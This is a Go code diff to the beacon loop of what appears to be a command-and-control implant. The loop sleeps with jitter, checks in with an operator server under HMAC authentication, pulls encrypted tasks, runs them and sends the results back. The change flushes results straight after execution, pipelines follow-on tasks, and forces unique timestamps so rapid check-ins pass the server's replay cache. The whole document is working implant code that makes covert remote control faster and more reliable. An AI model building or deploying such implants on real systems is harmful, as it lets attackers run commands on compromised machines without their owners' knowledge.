@@ -17,14 +17,15 @@ import (
 )
 
 type Beacon struct {
-	config        *Config
-	transport     transport.Transport
-	executor      *tasks.Executor
-	sessionID     string
-	sessionKey    []byte // AES session key for encrypted comms
-	sleep         time.Duration
-	jitterPct     int
+	config         *Config
+	transport      transport.Transport
+	executor       *tasks.Executor
+	sessionID      string
+	sessionKey     []byte // AES session key for encrypted comms
+	sleep          time.Duration
+	jitterPct      int
 	pendingResults []*pb.TaskResult // buffered results from failed sends
+	lastBeaconTs   int64            // last HMAC timestamp (unix sec); avoid replay on rapid flush
 }
 
 func New(cfg *Config) (*Beacon, error) {
@@ -69,7 +70,8 @@ func (b *Beacon) Run() {
 
 	log.Printf("[implant] registered: session=%s", b.sessionID)
 
-	// Beacon loop: single send per cycle
+	// Beacon loop: sleep → check-in (results + pull tasks) → execute → flush results immediately.
+	// Immediate flush avoids an extra full sleep before operators see task output (P0 RTT).
 	for {
 		// 1. Sleep with jitter (reduce for active SOCKS sessions)
 		sleepDuration := b.sleep
@@ -79,7 +81,7 @@ func (b *Beacon) Run() {
 		wait := zcrypto.JitterDuration(sleepDuration, b.jitterPct)
 		time.Sleep(wait)
 
-		// 2. Send beacon with any pending results
+		// 2. Send beacon with any pending results (retry path after failed flush)
 		resp := b.sendResults(b.pendingResults)
 
 		// 3. On failure, keep pendingResults for retry
@@ -90,7 +92,7 @@ func (b *Beacon) Run() {
 		// 4. On success, clear pendingResults
 		b.pendingResults = nil
 
-		// 5. Check terminate/sleep-update
+		// 5. Check terminate/sleep-update (0 = keep implant sleep; do not inflate)
 		if resp.Terminate {
 			log.Printf("[implant] terminate received, exiting")
 			return
@@ -119,7 +121,48 @@ func (b *Beacon) Run() {
 			result := b.executor.Execute(task)
 			b.pendingResults = append(b.pendingResults, result)
 		}
-		// 7. Results will be sent on NEXT cycle
+
+		// 7. Flush results immediately so task RTT is ~1 sleep, not ~2 sleeps.
+		if len(b.pendingResults) > 0 {
+			flushResp := b.sendResults(b.pendingResults)
+			if flushResp != nil {
+				b.pendingResults = nil
+				// Pull any tasks that arrived while we executed (pipelining).
+				if flushResp.Terminate {
+					log.Printf("[implant] terminate received, exiting")
+					return
+				}
+				if flushResp.NextCheckinMs > 0 {
+					b.sleep = time.Duration(flushResp.NextCheckinMs) * time.Millisecond
+				}
+				// Queue follow-on tasks for the next cycle (avoid unbounded execute loops).
+				more := b.decryptTasks(flushResp)
+				if len(more) > 0 {
+					// Re-beacon next iteration without full sleep when work is pending.
+					// Still honor a short floor to avoid hot-looping the C2.
+					b.pendingResults = nil
+					for _, task := range more {
+						if task.TaskType == pb.TaskType_TASK_EXIT {
+							return
+						}
+						if task.TaskType == pb.TaskType_TASK_SLEEP {
+							b.handleSleep(task)
+							b.pendingResults = append(b.pendingResults, &pb.TaskResult{
+								TaskId: task.TaskId, Success: true,
+							})
+							continue
+						}
+						b.pendingResults = append(b.pendingResults, b.executor.Execute(task))
+					}
+					if len(b.pendingResults) > 0 {
+						if fr := b.sendResults(b.pendingResults); fr != nil {
+							b.pendingResults = nil
+						}
+					}
+				}
+			}
+			// On flush failure, keep pendingResults for the next main-cycle retry.
+		}
 	}
 }
 
@@ -172,8 +215,20 @@ func (b *Beacon) register() error {
 	return nil
 }
 
+// nextBeaconTimestamp returns a unique unix-second timestamp for HMAC auth.
+// Rapid back-to-back beacons (result flush) must not reuse the same second or
+// the server ReplayCache rejects them as replays.
+func (b *Beacon) nextBeaconTimestamp() int64 {
+	ts := time.Now().Unix()
+	if ts <= b.lastBeaconTs {
+		ts = b.lastBeaconTs + 1
+	}
+	b.lastBeaconTs = ts
+	return ts
+}
+
 func (b *Beacon) sendResults(results []*pb.TaskResult) *pb.BeaconResponse {
-	now := time.Now().Unix()
+	now := b.nextBeaconTimestamp()
 	hmac := zcrypto.ComputeHMAC(b.config.Secret, b.config.ImplantID, now)
 
 	beacon := &pb.Beacon{
